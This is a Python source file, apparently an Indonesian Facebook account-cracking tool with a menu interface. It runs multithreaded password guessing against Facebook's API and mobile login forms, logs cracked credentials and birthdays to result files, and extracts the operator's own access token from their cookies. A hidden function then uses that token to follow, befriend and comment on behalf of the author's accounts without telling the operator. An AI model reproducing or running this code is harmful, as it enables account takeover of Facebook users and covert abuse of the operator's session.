					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil cp :("%(N,M,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
			else:
				print(" [!] Pilih yang bener");self.menu()
		elif jembut in["8","08"]:
			info_tools()
		elif jembut in["9","09"]:
			dump_id()
		elif jembut in["10"]:
		  __nguh__()
		 # os.system("git pull")
		  print(f"\n {N}[{H}✓{N}] Berhasil Mengupdate Tools");exit()
		elif jembut in["0","00"]:
			print ('\n')
			tod()
			jalan('\n %s[%s✓%s] Berhasil menghapus cookies'%(N,O,N))
			try:os.remove('cookies');os.remove('__yayan__.txt')
			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
			exit()
		elif jembut in[""," "]:
			print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
		else:
			print("\n %s[%s×%s] Pilih yang bener"%(N,M,N));waktu(1);self.menu()
		if len(self.id)!=0:
			print("")
			self.plerr()
		else:
			print("\n %s[%s×%s] Gagal mengambil ID, silahkan coba lagi"%(N,M,N));waktu(1);self.menu()
			
# mulai ngecrot awokawokawokkawok 
	def plerr(self):
		print('\n [+] total id -> %s%s%s' %(M,len(self.id),N))
		___yayanganteng___=input("%s [?] Ingin menggunakan sandi manual? [Y/t]: "%(N))
		if ___yayanganteng___ in(""," "):
			print("\n %s[%s×%s] isi yang bener"%(N,M,N));self.plerr()
		elif ___yayanganteng___ in("Y","y"):
			print ('\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih')
			while True:
				pwek=input('\n [?] Masukan Kata Sandi : ')
				if pwek in(""," "):
					print ('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
				elif len(pwek)<=5:
					print ('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
				else:
					def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
						cin=input("\n [?] Pilih : ")
						if cin in(""," "):
							print("\n %s[%s×%s] Pilih yang bener"%(N,M,N));self.__yan__()
						elif cin in("1","01"):
							print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
							print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
							with YayanGanteng(max_workers=30) as __yayanXD__:
								for ikeh in self.id:
									try:
										kimochi = ikeh.split("<=>")[0]
										__yayanXD__.submit(self.crackapi,kimochi,ysc)
									except: pass
							hasil(live,chek)
						elif cin in("2","02"):
							print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
							print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
							with YayanGanteng(max_workers=30) as __yayanXD__:
								for ikeh in self.id:
									try:
										kimochi = ikeh.split("<=>")[0]
										__yayanXD__.submit(self.mbasic_mobile,kimochi,ysc,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif cin in("3","03"):
							print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
							print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
							with YayanGanteng(max_workers=30) as __yayanXD__:
								for ikeh in self.id:
									try:
										kimochi = ikeh.split("<=>")[0]
										__yayanXD__.submit(self.mbasic_mobile,kimochi,ysc,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						else:
							print ('\n %s[%s!%s] input yang benar!'%(N,M,N))
					print("\n %s[%s?%s] Pilih Metode login - silahkan coba satu² :\n"%(N,K,N,))
					print(" %s[%s1%s]. Metode API (%sProses Cepat%s)"%(N,O,N,H,N))
					print(" %s[%s2%s]. Metode mbasic (%sProses Sedang%s)"%(N,O,N,K,N))
					print(" %s[%s3%s]. Metode mobile (%sProses Lama%s)"%(N,O,N,M,N))
					__yan__(pwek.split(","))
					break
		elif ___yayanganteng___ in("T","t"):
			print("\n %s[%s?%s] Pilih Metode login - silahkan coba satu² :\n"%(N,K,N,))
			print(" %s[%s1%s]. Metode API (%sProses Cepat%s)"%(N,O,N,H,N))
			print(" %s[%s2%s]. Metode Mbasic (%sProses Sedang%s)"%(N,O,N,K,N))
			print(" %s[%s3%s]. Metode Mobile (%sProses Lama%s)"%(N,O,N,M,N))
			self.__pler__()
		else:
			print ('\n %s[%s×%s] y/t goblok!'%(N,M,N));waktu(1);self.menu()
		return
		
	def __api__(self,user,_yan_):
		global ok,cp,ttl,loop
		print(f"\r [{O}{jam}{N}] crack: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
		for pw in _yan_:
			try: os.mkdir('results')
			except: pass
			user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
			ses=req.Session()
			api="https://b-api.facebook.com/method/auth.login"
			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
			send=ses.get(api,params=param, headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				ok+=1
				print(f"\r{N}[{H}✓{N}]{H} Berhasil                \n{N}[{H}✓{N}] ID {M}:{H} {user}                \n{N}[{H}✓{N}] Password {M}:{H} {pw}{N}                \n",end="")
				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] ID : {user}\n[×] Password : {pw}\n")
				live.append(f" [✓] ID : {user}\n[×] Password : {pw}")
				break
			elif "www.facebook.com" in send.json()["error_msg"]:
				try:
					__kontol__ = open('__yayan__.txt','r').read()
					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
					az = json.loads(ak.text)
					ttl= az['birthday'].replace("/","-")
					print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{K}×{N}] Password {M}:{K} {pw}                \n{N}[{K}×{N}] TTL {M}:{K} {ttl}{N}                \n",end="")
					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {user}|{pw}|{ttl}\n")
					chek.append(f" [×] {user}|{pw}|{ttl}")
					break
				except (KeyError, IOError):
					ttl = ' '
				except: pass
				print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{K}×{N}] Password {M}:{K} {pw}{N}                \n",end="")
				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n[×] Password : {pw}\n")
				chek.append(f" [×] ID : {user}\n[×] Password : {pw}")
				break
			else:
				continue

		loop += 1

	def mbasic_mobile(self,user,_yan_,beol,**kwargs):
		global ok,cp,ttl,loop
		print(f"\r [{O}{jam}{N}] crack: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
		for pw in _yan_:
			try: os.mkdir('results')
			except: pass
			ses=req.Session()
			a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
			b=parser(a,"html.parser")
			for x in b.find_all("input"):
				if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):continue
				else:kwargs.update({x.get("name"):x.get("value")})
			kwargs.update({"email":user,"pass":pw})
			tol=beol+b.find("form",method="post").get("action")
			if "m.facebook.com" in beol:ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":user_agent,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			else:
				if "mbasic.facebook.com" in beol:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
				else:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
				ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":user_agent,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			ses.post(tol,data=kwargs,allow_redirects=False)
			kuke=ses.cookies.get_dict()
			if "c_user" in kuke:
				ok+=1
				kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
				print(f"\r\x1b[1;32m  * --> {kuke.get('c_user')}|{pw}|{kuki}\x1b[0m\n",end="")
				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] {kuke.get('c_user')}|{pw}|{kuki}\n")
				live.append(f" [✓] {kuke.get('c_user')}{pw}{kuki}")
				break
			elif "checkpoint" in kuke:
				cp+=1
				try:uid=re.search("3A(\\d*)",kuke.get("checkpoint")).group(1)
				except:uid=user
				try:
					__kontol__ = open('__yayan__.txt','r').read()
					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
					az = json.loads(ak.text)
					ttl= az['birthday'].replace("/","-")
					print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {uid}                \n{N}[{K}×{N}] Password {M}:{K} {pw}                \n{N}[{K}×{N}] TTL {M}:{K} {ttl}{N}                \n",end="")
					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {uid}|{pw}|{ttl}\n")
					chek.append(f" [×] {uid}|{pw}|{ttl}")
					break
				except (KeyError, IOError):
					ttl = ' '
				except: pass
				print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {uid}                \n{N}[{K}×{N}] Password {M}:{K} {pw}{N}                \n",end="")
				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n[×] Password : {pw}\n")
				chek.append(f" [×] ID : {uid}\n[×] Password : {pw}")
				break
			else:
				continue

		loop += 1

	def __pler__(self):
		from lib import __cindy__
		wibu = input("\n [?] method : ")
		if wibu in[""," "]:
			print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__pler__()
		elif wibu in["1","01"]:
			print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
			print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
			with YayanGanteng(max_workers=50) as __yayanXD__:
				for yntks in self.id:
					try:
						bb = yntks.split("<=>")
						xz = __cindy__.pw_list(bb)
						__yayanXD__.submit(self.__api__,bb[0],xz)
					except:pass
			hasil(live,chek)
		elif wibu in["2","02"]:
			print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
			print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
			with YayanGanteng(max_workers=50) as __yayanXD__:
				for yntks in self.id:
					try:
						bb = yntks.split("<=>")
						xz = __cindy__.pw_list(bb)
						__yayanXD__.submit(self.modol,bb[0],xz,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif wibu in["3","03"]:
			print('\n [+] Hasil OK -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
			print(' [+] Hasil CP -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
			with YayanGanteng(max_workers=50) as __yayanXD__:
				for yntks in self.id:
					try:
						bb = yntks.split("<=>")
						xz = __cindy__.pw_list(bb)
						__yayanXD__.submit(self.mbasic_mobile,bb[0],xz,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("\n %s[%s×%s] isi yang bener ajg"%(N,M,N));self.__pler__()
			
def yntkts(kuki):
    try:
        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}
        memek  = req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=headerz, cookies=kuki).text
        kontol = re.search('(EAAA\\w+)', memek)
        kentod = kontol.group(1)
        print('\n\n %s[%s*%s] token fb kamu %s: %s%s'%(N,O,N,M,H,kentod))
        with open('__yayan__.txt', 'w') as (tod):
            tod.write(kentod)
        hoetankk()
    except:pass
        
koh = '100011146894081'
xi_jimpinx = '1379112335803650'
hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'best seller'])
goceng  = '1303409076707310'
def hoetankk():
	try:
		__kontol__ = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print('\n %s[%s×%s] Token Invalid'%(N,M,N))
		os.system('rm -rf __yayan__.txt')
	req.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__kontol__))
	req.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__kontol__))
	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__kontol__,__kontol__))
	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__kontol__))
	#exit('\n %s[%s×%s] Jalankan ulang perintah nya'%(N,M,N))

def yayanxd():
    try:
        kuki = open('cookies').read()
    except (KeyError, IOError,FileNotFoundError):
        os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt');os.system('clear')
        print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
        kuki = input("\n %s[%s?%s] Cookies : %s"% (N,K,N,O))
        if kuki in['OPEN','Open','open']:
          import subprocess
          exit(subprocess.Popen(["am","start","https://youtu.be/DF7bUCn0GFY"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
    kuki = {"cookie":kuki}
    pppk = req.get(f"https://mbasic.facebook.com/profile.php",cookies=kuki).text
    if "mbasic_logout_button" in str(pppk):
        nama=re.findall(r'<title>(.*?)</title>',pppk)[0]
        print("\n\n %s[%s*%s] Selamat datang %s%s%s "%(N,O,N,H,nama,N))
        waktu(2)
        print ('\n %s*%s Mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...\n'%(O,N))
        waktu(2)
        ngentod()
    else:
    	print('\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1);yayanxd()
    try:
    	with open("cookies","w") as pler:
    		pler.write(kuki["cookie"])
    	yntkts(kuki)
    except:pass


if __name__=="__main__":
	try:
		kuki = open('cookies').read()
		kueh = {"cookie":kuki}
	except (KeyError, IOError,FileNotFoundError):
		yayanxd()
	ngewe().menu()
